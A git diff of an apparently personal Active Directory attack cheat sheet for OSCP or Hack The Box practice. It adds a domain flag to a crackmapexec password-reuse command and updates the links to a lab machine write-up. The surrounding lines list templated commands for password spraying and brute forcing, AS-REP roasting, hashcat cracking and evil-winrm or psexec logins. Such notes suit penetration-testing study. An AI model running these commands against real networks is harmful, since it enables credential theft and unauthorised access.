@@ -1297,12 +1297,12 @@ Verify listener hooked:
 
 |   |   |
 |---|---|
-|Scan for password reuse (domain)|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD -d`|
+|Scan for password reuse (domain)|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD -d $DOMAIN`|
 |Scan for password reuse (local administrator, hash)|`crackmapexec smb $TARGET_RANGE -u administrator -H $NT_HASH --local-auth`|
 |Brute force password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD_LIST`|
 |List users|`crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --users`|
 
-Used in: [Flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md), [SVCORP](https://github.com/joetanx/oscp/blob/main/pwk-lab/svcorp.md), [VulnDC](https://github.com/joetanx/oscp/blob/main/itsl/2022-01-10-VulnDC.md), [VulnDC2](https://github.com/joetanx/oscp/blob/main/itsl/2022-01-17-Vulndc2.md)
+Used in: [Infiltrator](/machines/infiltrator.md)
 
 ### 9.1. [AS-REP roasting](/notes/attacking-active-directory.md#1-as-rep-roasting)
 
@@ -1313,6 +1313,8 @@ Used in: [Flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md), [SVC
 |Use GetNPUsers.py to get password hashes|`impacket-GetNPUsers $DOMAIN/$USERNAME -no-pass -dc-ip $DC_IP`|
 |Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
 |Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
+
+Used in: [Infiltrator](/machines/infiltrator.md)
 
 ### 9.2. [Password dumping](/notes/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
 
